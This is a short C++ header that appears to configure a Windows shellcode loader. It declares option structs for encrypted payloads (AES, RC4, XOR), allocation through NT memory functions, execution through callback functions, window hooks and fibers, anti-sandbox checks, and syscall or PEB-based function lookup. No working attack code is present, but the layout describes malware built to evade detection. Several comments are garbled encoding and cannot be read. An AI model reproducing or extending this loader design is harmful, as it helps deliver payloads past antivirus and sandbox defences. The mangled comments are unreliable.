#pragma once
#pragma once
#include <cstdint>
#include <Windows.h>  





//������ܷ�ʽ
typedef struct _DecryptStruct
{
    int PAYLOAD_ENCODING_AES;
    int PAYLOAD_ENCODING_RC4;
    int PAYLOAD_ENCODING_XORSHIFT;

} DecryptStruct;



//��������ڴ淽ʽ
typedef struct _ChooseFunc {
    int  UNtAllocateVirtualMemory;
    int  UNtCreateSection;
    int  UHeapAlloc;
}ChooseMemNtFunc, * pChooseMemNtFunc;


typedef struct _ChooseEnumMethod {
    int EnumFontsW_exe;
    int EnumWindows_exe;
    int EnumChildWindows_exe;
    int EnumDesktopsW_exe;
} ChooseEnumMethod, * PChooseEnumMethod;

typedef struct _ChooseExeMethod {
    ChooseEnumMethod enumMethod;
    int SetWindowsHookExW_exe;
    int fiber_exe;
} ChooseExeMethod, * PChooseExeMethod;


//���巴ɳ�䷽ʽ
typedef struct _AntiSandBox {
    BOOL ctime_acceleration;
    BOOL cCPUandMem;
    BOOL cLanguage;
    BOOL cprocesses;
}AntiSandBox,*PAntiSandBox;

//定义获取nt函数方式

typedef struct _ChooseNtFunctions {
    BOOL Peb_Ntdll;
    BOOL SysCall;
}ChooseNtFunctions, * PChooseNtFunctions;